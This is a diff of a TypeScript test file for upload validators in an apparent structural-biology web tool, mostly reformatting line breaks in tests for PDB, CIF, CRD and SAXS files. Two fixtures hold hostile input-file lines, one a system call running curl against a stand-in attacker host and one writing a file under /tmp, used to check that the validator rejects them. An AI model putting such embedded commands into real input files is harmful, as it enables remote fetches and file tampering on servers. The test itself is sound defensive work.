@@ -67,7 +67,10 @@ describe('ValidationFunctions', () => {
       'system "curl http://attacker.com"',
       'return'
     ].join('\n')
-    const result = await isValidConstInpFile(makeFile('evil.inp', content), 'pdb')
+    const result = await isValidConstInpFile(
+      makeFile('evil.inp', content),
+      'pdb'
+    )
     expect(typeof result).toBe('string')
     expect(result as string).toContain('system')
   })
@@ -79,7 +82,10 @@ describe('ValidationFunctions', () => {
       'open unit 10 write card name /tmp/evil',
       'return'
     ].join('\n')
-    const result = await isValidConstInpFile(makeFile('evil.inp', content), 'pdb')
+    const result = await isValidConstInpFile(
+      makeFile('evil.inp', content),
+      'pdb'
+    )
     expect(typeof result).toBe('string')
     expect(result as string).toContain('open')
   })
@@ -136,7 +142,9 @@ describe('ValidationFunctions', () => {
       'HETATM    3  FE  HEM A   3',
       'END'
     ].join('\n')
-    const result = await hasAllowedResiduesOnly(makeFile('cofactors.pdb', content))
+    const result = await hasAllowedResiduesOnly(
+      makeFile('cofactors.pdb', content)
+    )
     expect(result.valid).toBe(true)
     expect(result.unsupportedResidues).toHaveLength(0)
   })
@@ -230,9 +238,7 @@ describe('ValidationFunctions', () => {
       '* g',
       '      10  EXT'
     ].join('\n')
-    expect(await isCRD(makeFile('too-many-stars.crd', badContent))).toBe(
-      false
-    )
+    expect(await isCRD(makeFile('too-many-stars.crd', badContent))).toBe(false)
   })
 
   it('isCRD fails when EXT is missing after header', async () => {
@@ -365,9 +371,9 @@ describe('cifContainsChainId', () => {
       'ATOM 1 ASN',
       '#'
     ].join('\n')
-    expect(
-      await cifContainsChainId(makeFile('nochain.cif', noChainCif))
-    ).toBe(false)
+    expect(await cifContainsChainId(makeFile('nochain.cif', noChainCif))).toBe(
+      false
+    )
   })
 
   it('returns false for a non-CIF file', async () => {
@@ -396,26 +402,21 @@ describe('cifHasAllowedResiduesOnly', () => {
       'ATOM 1 UNK A',
       '#'
     ].join('\n')
-    const result = await cifHasAllowedResiduesOnly(
-      makeFile('bad.cif', badCif)
-    )
+    const result = await cifHasAllowedResiduesOnly(makeFile('bad.cif', badCif))
     expect(result.valid).toBe(false)
     expect(result.unsupportedResidues).toContain('UNK')
   })
 
   it('returns invalid when no _atom_site block is found', async () => {
     const empty = 'data_test\n#\n'
-    const result = await cifHasAllowedResiduesOnly(
-      makeFile('empty.cif', empty)
-    )
+    const result = await cifHasAllowedResiduesOnly(makeFile('empty.cif', empty))
     expect(result.valid).toBe(false)
   })
 })
 
 describe('hasSaxsQualityIssues', () => {
   // Helper that builds a SAXS .dat line: "q I err"
-  const saxsLine = (q: number, I: number, err: number) =>
-    `${q} ${I} ${err}`
+  const saxsLine = (q: number, I: number, err: number) => `${q} ${I} ${err}`
 
   it('returns lowSnrCount=0 and warning=null when all error/I ratios are at or below 2', async () => {
     // Three points where error/I = 2.0 exactly — the threshold is STRICT (> 2),
@@ -423,7 +424,7 @@ describe('hasSaxsQualityIssues', () => {
     const content = [
       saxsLine(0.01, 100, 200), // ratio = 2.0 — at threshold, NOT flagged
       saxsLine(0.02, 80, 160), //  ratio = 2.0 — at threshold, NOT flagged
-      saxsLine(0.03, 60, 1)   //  ratio ≈ 0.017 — well below threshold
+      saxsLine(0.03, 60, 1) //  ratio ≈ 0.017 — well below threshold
     ].join('\n')
 
     const result = await hasSaxsQualityIssues(makeFile('clean.dat', content))
@@ -436,9 +437,9 @@ describe('hasSaxsQualityIssues', () => {
   it('returns lowSnrCount=2 and a warning mentioning "2 of 3" when two points have error/I > 2', async () => {
     // Points at q=0.01 and q=0.02 have error/I > 2; q=0.03 is clean.
     const content = [
-      saxsLine(0.01, 10, 30),  // ratio = 3.0 — flagged
-      saxsLine(0.02, 20, 50),  // ratio = 2.5 — flagged
-      saxsLine(0.03, 60, 1)   //  ratio ≈ 0.017 — clean
+      saxsLine(0.01, 10, 30), // ratio = 3.0 — flagged
+      saxsLine(0.02, 20, 50), // ratio = 2.5 — flagged
+      saxsLine(0.03, 60, 1) //  ratio ≈ 0.017 — clean
     ].join('\n')
 
     const result = await hasSaxsQualityIssues(makeFile('noisy.dat', content))
@@ -472,9 +473,7 @@ describe('hasSaxsQualityIssues', () => {
       saxsLine(0.02, 80, 5)
     ].join('\n')
 
-    const result = await hasSaxsQualityIssues(
-      makeFile('comments.dat', content)
-    )
+    const result = await hasSaxsQualityIssues(makeFile('comments.dat', content))
 
     expect(result.totalCount).toBe(2)
     expect(result.lowSnrCount).toBe(0)
@@ -484,14 +483,12 @@ describe('hasSaxsQualityIssues', () => {
   it('computes maxErrorRatio correctly across all data points', async () => {
     // ratios: 0.5, 1.0, 3.0 — max should be 3.0
     const content = [
-      saxsLine(0.01, 100, 50),  // ratio = 0.5
+      saxsLine(0.01, 100, 50), // ratio = 0.5
       saxsLine(0.02, 100, 100), // ratio = 1.0
-      saxsLine(0.03, 10, 30)   //  ratio = 3.0 — also flagged
+      saxsLine(0.03, 10, 30) //  ratio = 3.0 — also flagged
     ].join('\n')
 
-    const result = await hasSaxsQualityIssues(
-      makeFile('ratios.dat', content)
-    )
+    const result = await hasSaxsQualityIssues(makeFile('ratios.dat', content))
 
     expect(result.maxErrorRatio).toBeCloseTo(3.0, 5)
     expect(result.lowSnrCount).toBe(1)
@@ -521,7 +518,7 @@ describe('hasSaxsQualityIssues', () => {
   it('skips lines where I <= 0 and does not count them toward totalCount', async () => {
     // A line with I = 0 is skipped by the guard `I <= 0`.
     const content = [
-      saxsLine(0.01, 0, 5),   // I = 0 — skipped
+      saxsLine(0.01, 0, 5), // I = 0 — skipped
       saxsLine(0.02, 80, 10) //  valid
     ].join('\n')
 
